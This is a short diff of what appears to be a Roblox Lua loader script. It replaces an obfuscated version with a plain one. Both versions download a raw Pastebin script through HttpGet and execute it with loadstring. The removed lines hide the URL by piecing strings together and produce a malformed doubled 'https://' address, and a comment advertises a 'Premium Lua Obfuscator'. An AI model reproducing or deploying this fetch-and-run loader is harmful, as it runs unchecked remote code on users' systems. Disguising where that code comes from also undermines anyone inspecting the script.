@@ -16,11 +16,11 @@
 ╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
 --]]
 
-local a = getfenv or function() return _ENV end
-local b = "h" .. "t" .. "t" .. "p" .. "s" .. "://" .. "https://pastebin.com/raw/cbBsFWLF"
-local c = game["HttpGet"](game, b, true)
-local d = loadstring(c)
-d()
+-- Get and run remote script from Pastebin
+local url = "https://pastebin.com/raw/cbBsFWLF"
+local response = game:HttpGet(url)
+local func = loadstring(response)
+func()
 task.wait(1)
 
 -- Protected by Premium Lua Obfuscator V2.0 - Universal Compatibility
